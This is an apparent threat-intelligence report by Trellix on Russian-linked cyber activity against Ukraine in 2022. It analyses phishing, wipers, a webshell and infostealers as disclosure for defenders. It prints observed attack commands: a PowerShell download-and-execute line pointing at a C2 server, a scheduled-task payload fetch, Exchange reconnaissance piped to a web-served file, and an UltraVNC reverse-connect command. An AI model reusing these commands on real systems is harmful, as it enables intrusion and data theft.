Stories
The latest cybersecurity trends, best practices,
security vulnerabilities, and more

By Trellix · June 6, 2022
Per public attribution, Russian cybercriminal groups have always been active. Their tactics,
techniques, and procedures (TTPs) have not significantly evolved over time, although some
changes have been observed. Lately, the threat landscape has changed, as multiple
domains have partially merged. This trend was already on-going, but the increased digital
activity further accelerated and exposed said trend. This paper will cover the cybercriminal
evolutions over time, the impact of a (cyber)war, observed activity, and finally a call to
action.

Cybercriminal evolutions over time

1/22

The changes over time can be split into multiple evolutions, where each evolution is based
on the one prior. This section provides insight into these evolutions, in chronological order.
As these events unfolded organically, it is important to note that there is no exact date when
one transformed into another. The goal here is to provide a further understanding of the
historic events which occurred prior to the latest, and still ongoing, transformation.

Cybercrime
Whenever there is money to be made, there are people willing to risk it all. Some aren’t shy
to break the law to gather a fortune, although each criminal individual’s actions differ, the
result is the same. The digital world is certainly no exception, where one can argue that the
anonymous nature of online interactions might be an accelerant. Most offenders generally
operate based on opportunity. A server which hasn’t been patched for years makes for an
easy target, especially with publicly available tooling to exploit the discovered
vulnerabilities.

Organized cybercrime
The next step, as is also seen in traditional crime, is for individuals to organize themselves.
The more generalist nature of the original cybercriminals required defenders to uphold a
certain level of security. The bundling of forces allows individuals to branch out into a
specific area of expertise. As such, the previously set security standards become
insufficient, thus requiring blue teams to raise the bar. With the additional knowledge,
groups can exploit vulnerabilities based on incomplete write-ups or partial proof-ofconcepts. Their targets are still opportunity based, allowing the actors to target a wider
variety of potential victims. The path of the least resistance is generally the most profitable
here.

Nation state campaigns
Nation state campaigns are often set up with a different goal than (organized) cybercrime.
Usually, such actors conduct online espionage, potentially along with in-person espionage.
These groups are commonly characterized by their advanced methods, their persistent
nature, and the threat they pose, commonly summarized as an Advanced Persistent Threat,
abbreviated as APT. Their goal is to complete the set objective(s), without solely relying on
opportunity.
Naturally, misconfigured machines and publicly available exploits provide ample
opportunities to these groups, as can be seen with the ProxyLogon and ProxyShell
vulnerabilities and their aftermath. These groups are, in contrast to most (organized)
cybercrime, able to find their own way into a given target. The more advanced nation states
are capable of finding vulnerabilities and creating their own exploits for them, ahead of the

2/22

general public. This makes such an attack difficult to defend against, and the relentless
nature of these groups drags the battle between the attacking and defending groups on,
until the victim is either compromised, or no longer of strategic value for the attacker.
Additionally, nation state backed groups do not always opt to profit directly from their
activity. Taking systems hostage with ransomware, or simply wiping them using a wiper,
imposes a cost on victims as they need to restore their systems, deal with downtime, and
ensure the integrity of the (seemingly) unaffected systems.

Merging domains
Long has there been speculation with regards to nation state involvement in (organized)
cybercrime. This is difficult to prove in general, and even with some proof, skeptics continue
to poke holes in the attribution. The leak of the Conti chats, more on which below, has
provided solid evidence of the group’s ties with the Russian government. The amount of
proof for such a claim is the first of its kind and allows analysts to view the exact
conversations between actors. The criminals benefit by getting “immunity” of sorts, whereas
the nation state benefits from the covered operation under the flag of the actor. Especially in
the case when collaborating with a ransomware gang, such as Conti, the encrypted
systems provide little information about the intrusion and activities on the system. This
further masks the actions that were performed on the system.
Since many Ukraine government sites were taken offline by suspected Russian actors in
January 2022, Trellix Threat Labs has seen many parties involved, from civilian groups,
such as the different ‘anonymous’ movements, to semi-government sponsored groups like
the ‘Ukrainian Cyber Army’, to nation-state groups that disrupt communication and
infrastructure. Each of them is leveraging open-source adversary tools in their attacks,
which makes it difficult to attribute the attacks to one or more specific groups. In the image
below, the distinct groups, and the most prevalent observed attack methods, Trellix Threat
Labs has observed over time are given. They categorized into ‘AN_’ groups, the
anonymous movement like groups; ‘Pro_’ groups, which are conducting attacks showing
their allegiance towards one of the countries involved in the conflict; and ‘APT_’ groups,
nation-state-sponsored groups.

3/22

Figure 1. Overview of groups involved in the conflict.
As one can imagine, tracking activities on the social media platforms many of these groups
are using can be challenging. From the information posted, one must consider: is it reliable,
is it misinformation, is it propaganda, are images or data manipulated or backdoored?
With these attacks happening, the barriers which are traditionally seen between the
different actors are blurring. As barriers become distorted, filling out a diamond model of
intrusion on the different actors involved gets more complicated because of the similar tools
and techniques and targets.

4/22

Figure 2. Fading barriers
As illustrated earlier on, the Conti ransomware group’s stance with regards to the Russian
invasion in Ukraine cost them, as their data was leaked, providing researchers not only with
the aforementioned chat leaks, but also a copy of the ransomware’s source code. A proUkrainian group, dubbed NB65, then took this source code and modified it, after which they
started to attack targets in Russia. Due to the police’s protection, the actor’s own region is
often left unaffected, a small price to pay to ensure little to no police involvement, making
this move rather unheard of. Below is a screenshot of the NB65’s ransomware note.

5/22

Figure 3. Ransom note
Cybercriminal groups could have been used to gain access credentials from potential
targets. We have seen from the leaked Conti chats that the group was in contact with
government officials that asked for ‘information’ on compromised networks. Why spend
resources gaining credentials when it is possible to ask cybercrime groups for access
credentials then offer ‘protection’? Once long-term access has been established,
intelligence can be exfiltrated and during a conflict, disruptive actions can be executed, as
can be read about in the next section.

The impact of (cyber)war
With the ever-increasing intertwining of our digital and physical lives, the impact of a (digital)
war is increasing day by day. There’s been a lot of speculation about a “full blown cyberwar”
prior to the Russian invasion. Something can be said in favor of these arguments, but when
missiles explode in your vicinity, computers aren’t that interesting anymore. Once the most
direct danger has passed, however, the digital domain is vital to securely and timely
communicate with one another. It is also a safe way to perform reconnaissance, in contrast
to sending a squad to scout a hostile area.

6/22

To support our customers and the people of Ukraine, Trellix Threat Labs coordinated with
multiple government institutions to provide them with the necessary telemetry insights,
intelligence briefings and analysis of the malware tools used by Russian actors. A large
portion of Trellix's efforts were performed in discretion as protection of our customers is our
highest priority.

Observed activity
Just as physical warfare uses a multitude of military tactics and equipment, Trellix Threat
Labs has observed similar activity on the cyberfront, including but not limited to wipers,
spear-phishing, back-doors, vulnerabilities, and many other techniques. In the following
sections, several of these activities will be highlighted, along with the attributed actors.
Initially, we observed different groups using several tactics to gain access, gather
information and credentials, and establish and maintain access to the victim’s networks.
The visualization below showcases which groups were observed, along with their initial
attack modus operandi, after which they determined their next steps.

Figure 4. Initial attack techniques used by observed groups

Gamaredon
Over the years, the pro-Russian Gamaredon group has been digitally operating in Ukraine.
Their targets are mostly national institutes and government entities, based on Trellix Labs’
observations.
From February to March 2022, we observed a Word document attached to a spear-phishing
e-mail which was created to appear as a legitimate Ministry of Foreign Affairs document,
while it was backdoored with a VBS script to download and install a persistent file on the
victim’s machine.
7/22

Figure 5. Attack overview Gamaredon using backdoored Office documents

Figure 6. Example of the document
After opening this document, the script in the macro code was executed:

Figure 7. Macro code example

8/22

Cleaning up the code, we observe the creation of a scheduled task. The task’s schedule
frequency is set to minutes, where the modifier is set to 12.
Wscript.exe launching "C:\\Windows\\System32\\schtasks.exe" /Create /SC MINUTE /MO
12 /F /tn Word.Downdloads /tr
The scheduled task downloads the payload from this website:
hxxp://saprit.space/ACBFDE98.rar
After the download, the rar file is renamed to a .exe file and is saved as a vbs file:
C:\\Users\\3e837342b1d29db33fcb762a84f23aa5\\AppData\\Roaming\\Microsoft\\Excel\\
ExelCreate_v.ACBFDE98.vbs
Unfortunately, the final payload was not available for analysis, but the pattern of intrusion
and macro code were similar observed by others investigating this same actor.
During that same timeframe, we observed a similar document used to target victims.
Although both documents are dated (based on metadata, but we realize these can be
manipulated), it could either be a case of simulating an attack or re-using the same modus
operandi with adjusted payloads.
When the macro is executed in the second document, it follows the below steps:
Winword.exe creating the file
"C:\Users\\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\IndexOffice.vbs"
Wscript.exe launching the process schtasks.exe with command line
"C:\Windows\System32\schtasks.exe" /Create /SC MINUTE /MO 12 /F /tn
Word.Downdloads /tr C:\Users\
\AppData\Roaming\Microsoft\Office\IndexOffice.vbs
Wscript.exe launching the process schtasks.exe with command line

Word.Documents /tr
C:\Users\\AppData\Roaming\Microsoft\Office\IndexOffice.exe
Downloads payload from hxxp://cornelius.website/WindowsNewsense.php
Appends and creates the file ‘IndexOffice.vbs)

Phishing the Ukrainian Ministry of Defense
In March, we observed several phishing attempts trying to impersonate the Ministry of
Defense of Ukraine. One email, sent on March 23rd, had the subject “Доступний новий
ресурс” (“A new resource is available” in English), and was sent to at least 42 recipients.
The URL in the message pointed to hxxp://file-milgov[.]systems/ and the domain resolved to
9/22

the following IP 93.95.227[.]226, which belongs to a hosting provider in Iceland. We were
not able to identify who might have setup these campaigns. In the bigger picture of
observing several tactics and techniques being used, this is another example of adversaries
can attempt to gain credentials from victim networks.
Upon closer inspection of the webpage, it asks for a username and password and identifies
itself as the “Міністерство Оборони України Файлове сховище”, which translates to
“Ministry of Defense of Ukraine File Storage” in English.

Figure 8. Fake login page

10/22

When a user fills in credentials, the webpage responds with a small error message at the
bottom of the page: “Невдала спроба входу” translates to “Unsuccessful login attempt”.

Figure 9. The error message
The specific server had other error pages which mimicked another internal error: “Вибачте,
на сервері ще ведуться технічні роботи”, which translates to “Sorry, the server is still
undergoing technical work” in English.

11/22

Figure 10. Different Error message found on the server
The same server, 82.221.139[.]137, also hosted an additional suspected phishing page.
Interesting to note, the page features an explicit warning to turn JavaScript on, in order to
use this mail server contained on the page.

Figure 11. Another suspected Phishing page.
The IP address 82.221.139[.]137 was observed in other spear phishing campaigns
impersonating the cybersecurity center and CSOC in Ukraine.

Wipers

12/22

Communication is vital to survive during wartime, and the adversarial use of malware
attacks to “wipe” communication systems has been widespread in the region. A wiper’s sole
purpose is to wipe the device it is executed on, and potentially other connected devices. If
the execution is successful, the device is rendered useless, and whether back-ups are
available or not, the machine does not function at all. The recovery of a single machine
might not take long, but the restoration of a company or government-wide attack may take
months and cause disruption when communication, access to data, and coordination are
critical.
When actors choose to use a wiper, they know that the weapon may be used against them.
Aside from the damage, it is often used as propaganda to demonstrate how ‘weak’ the
enemy’s defenses are. In the diagram below, the different wiper families that have been
observed since the start of the conflict, including attribution, are visualized. Ember Bear and
APT28 are Russian nation state actor groups, where the other groups are likely to be proRussian or pro-Ukrainian, however not enough evidence is available to make those claims
solid.

Figure 12. Wiper families and their attribution
It’s important to understand that to deploy a wiper, the actor needs access to the physical
disk, which requires administrator or system privileges. We have observed actors using
trusted tools and stolen certificates, mimicking ransomware, and employing several tactics
to hide these attack-tools from being detected and ensure that access to the network
remains available to the actor.

13/22

In one example, Trellix Threat Labs observed an actor access a victim’s network with the
intent to wipe their systems. When the first wiper (dubbed WhisperGate) failed to execute, it
took the actors only two and a half hours to deploy another wiper (HermeticWiper) instead.

Targeted exchange servers
One of our Ukrainian clients also detected activities in March 2022, using vulnerabilities to
attack the internal network and store the output in a file accessible from the Internet. In the
command-lines below, we observe that the actor is gaining information from the system and
writing the output of the command towards the file ‘owafont_ua.css’ hosted on the OWA
Exchange webserver.
Checking for the content of the ‘usoshared’ folder that is part of the Windows Update
mechanism, we found the folder mostly contains etl files, files that contain system log
events from the Windows System Kernel:
c:\windows\system32\cmd.exe /c dir c:\programdata\usoshared > "C:\Program
Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"
Here the attacker is launching the command to discover if any scheduled tasks with details
are present on the system:
c:\windows\system32\cmd.exe /c schtasks /query /v > "C:\Program
Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"
Querying systeminfo:
c:\windows\system32\cmd.exe /c systeminfo > "C:\Program Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"
Querying for task lists:
c:\windows\system32\cmd.exe /c tasklist >> "C:\Program Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"
Querying for active TCP network connections on the victim’s system:
c:\windows\system32\cmd.exe /c netstat -anbp tcp >> "C:\Program
Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"
Showing the ARP table/cache on the host to discover more hosts on a network:
c:\windows\system32\cmd.exe /c arp -a >> "C:\Program Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\resources\owafont_ua.css"

14/22

These commands were executed in such a rapid manner that these were executed using a
webshell, stored on that same Exchange server.

UAC-0056
In April 2022, Trellix Labs observed indicators which the Ukrainian CERT has attributed to
Russian threat group UAC-0056. The attack primarily targets the Ukrainian government and
energy sector.
Malicious Excel documents were sent as attachments from a compromised email account.
Once the document was opened, either embedded code would be constructed and
executed, or it would download the next stage from the Internet. The next stage ranges
from implants to Cobalt Strike beacons. Compromised sites, Discord servers, and prestaged domains have been observed to store these implants. The implants go by the name
Graphsteel and Grimplant and were implemented to steal user credentials, network
information, and then exfiltrate said information in encrypted form to the C2 using a
Google’s high performance Remote Procedure Call framework called gRPC.

Figure 13. Attack overview GraphSteel and Grimplant

APT28

15/22

On April 18, 2022, a malicious email, presumably from a compromised ukr[.]net account,
with subject “ua_report”, was observed on one of our email gateways. This email attempted
to lure the victim to open the attached compressed file with the following line “Operation
‘The Eye of Sauron’ results” followed by the password needed to open the attachment.

Figure 14. Attack flow overview APT28 attack
Once executed, the password protected self-extracting RAR will drop on the system an
executable called “Doc_Viewer.exe” or “DocumentSaver.exe”, and a DLL called
“SQLite.Interop.dll”. The executable is a .NET infostealer which uses the bundled DLL to
interact with various browser’s SQLite databases and extract the stored credentials and
cookies. This activity was reported by Google’s TAG and attributed to the infamous APT28
aka Fancy Bear threat actor, known for its ties with the Russian GRU.
On execution the infostealer will remove its traces, for stealthy purposes, by deleting the
SQLite DLL and the malicious executable, as can be seen in the code below.
cmd.exe /C Del SQLite.Interop.dll
cmd.exe /C Del C:\Users\\AppData\Local\Temp\RarSFX0\Doc_Viewer.exe
This is an example of the .NET malware stealing credentials, more specifically trying to
obtain the stored cookies in the Firefox database. Cookies can contain values that can be
abused to hijack the session from the user and impersonate as that user.

Figure 15. Code example of grabbing cookie values

16/22

After it is finished gathering stolen credentials, the .NET sample will leverage compromised
IMAP credentials embedded on the sample to exfiltrate the stolen information. We have
observed the following compromised accounts used to connect to the indicated IMAP
servers
events@sartoc.com - 144.208.77.]68:143
gopal@hhaisoffice.com - 216.40.42.]5:143

DoubleDrop
On May 9, 2022, a government client in Ukraine received a spear phishing email to one of
their general email addresses. The email contained a message pointing to a catalog
included in a zip archive, which could be found at the given Google Drive URL:
drive.google.]com/file/d/1JBYjdNp5NnvJyYtR5azWBuRZZIjhto9z. To open the archive, the
recipient needs a password (“ ifYQFl” without quotes), which is enclosed within the e-mail's
body, as can be seen below.

Figure 16. Attack Flow Overview DoubleDrop
The LNK file contains a PowerShell reference command to be executed, which executes a
base64 encoded command in a hidden window. The decoded command is given below.
New-Object
(System.New.WebClient).DownloadFile(“http://78.40.219.]13:8888/file”,
“$env:temp\helper.exe”);
Start-Process -FilePath “$env:temp\helper.exe” -ArgumentList “–host 46.229.215.108 –port
4433” -WindowStyle Hidden;
rm $pwd\*.lnk;
The newly created web client is used to download the “helper.exe” file in the temporary file’s
directory, from the given URL. Note that the added bracket is not present in the original
script but is used to defang the URL in this article. The newly downloaded executable is
then executed as a new process with a hidden window, together with four arguments which
specify the host and port to be used. At last, the LNK file, which originally started this
execution chain, is deleted.
Investigating one of the endpoints, we observe the following path:
C:\Users\*********\AppData\Local\Temp\helper.exe\” –host 46.229.215.108 –port 4433
The “helper.exe” binary is written in the GO language. Several anti-analysis tricks, such as
obfuscating strings and garbage code, have been applied to make the analysis of this
binary more challenging.

18/22

From the log files we observed that the ‘helper.exe’ is querying the system information from
the registry and sends that onwards to the C2 server. Also, information from the Internet
Browser like cookies, form history, passwords and more are gathered and forwarded. From
the traffic analysis we can observe that the C2 server was hosting a special ‘data’ folder for
it:
Post “https://46.229.215.]108:4433/data”: write tcp X.X.X.X:49202->46.229.215.108:4433:
wsasend
At the same time a batch script is installed and after initial information is gathered, it will
delete the helper.exe and the batch script:
chcp 65001~~TaskKill /F /IM 3796~~Timeout /T 2 /Nobreak~~Del /a
\”C:\Users\********\AppData\Local\Temp\helper.exe\
cmd.exe \”/C C:\Users\***\AppData\Local\Temp/1.bat & Del 1.bat\
Overall, we observed a well setup operation, many parts attempting as much as possible to
circumvent detection to gather information that can be used to compromise the victim and
get further access to the network.

Gamaredon activity
Trellix Threat Labs detected the presence of an UltraVNC Remote Admin tool on one of our
Ukrainian customers. Remote admin tools are often used to bypass security controls. The
executable was discovered in the following path:
C:\Users\\AppData\Roaming\wuauclt.exe –
cedbbbc4deb6569c23aa20ac64ad1c2b2bef6f7b3405cef861f26a0b44d836d9
Pivoting from our initial data, we discovered, we found the parent SFX archive file.

19/22

Figure 17. Attack Flow Overview
The self-extracting archive has the following commands:

Figure 18. SFX Config Options

This will essentially extract the files in the archive to %APPDATA% folder and then execute
the 14991.cmd batch file.
The contents of the 14991.cmd batch file is as follows:

20/22

Figure 19. Contents of the 14991.cmd file
This will essentially copy 31850.ini to wuauclt.exe and start wuauctl.exe with the following
command line:
"%CD%\wuauclt.exe" -autoreconnect -id:%RANDOM% -connect torrentvnc.ddns[.]net:5612
The advantage of each of these command line options is as follows:
wuauclt.exe – UltraVNC server disguised as windows update auto update client of
Microsoft
autoreconnect - Attempt to reconnect to the listening viewer if the connection drops
connect – Reverse-connect to the repeater host on specific host and port, this is used
to bypass any firewall restrictions since the connection is initiated by the victim
id – serves as a unique UltraVNC server identifier to the repeater, the advantage of
this repeater setup is primarily two-fold:
It allows for connections to multiple servers; this gives attacker the ability to use
the same payload for all victims and attacker can also simply change this
repeater C2 host if they want to reuse payload in a future campaign
The Repeater host acts as a proxy for the server and the viewer; this gives
attacker the ability to mask the real host on which he is running the UltraVNC
viewer
UltraVNC.ini is the UltraVNC configuration file that will be consumed by UltraVNC server.
The files rc4.key, MSRC4Plugin_for_sc.dsm are also consumed by the UltraVNC server
program to encrypt the UltraVNC network traffic.

A call to action
Trellix has historically had a significant customer base in Ukraine and when the
cyberattacks targeting the country intensified, we coordinated closely with government and
industry partners to provide greater visibility into the evolving threat landscape. We have
been eager to support the region against malicious cyber activity and have been able to go

21/22

beyond sharing knowledge to also provide a wide range of security appliances at no cost in
the affected region (our special thanks go out to our partners at Mandiant in getting some of
the appliances deployed at those organizations who needed protection the most).
